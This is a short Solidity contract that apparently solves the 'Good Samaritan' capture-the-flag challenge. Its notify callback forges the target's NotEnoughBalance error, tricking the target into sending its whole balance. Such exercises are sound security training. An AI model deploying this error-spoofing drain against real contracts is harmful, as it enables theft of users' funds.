// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract GoodSamaritanAttacker {
    address public challengeInstance;
    error NotEnoughBalance();

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IGoodSamaritan(challengeInstance).requestDonation();
    }

    function notify(uint256 amount_) external {
        if (amount_ == 10) {
            revert NotEnoughBalance();
        } else {
            true;
        }
    }
}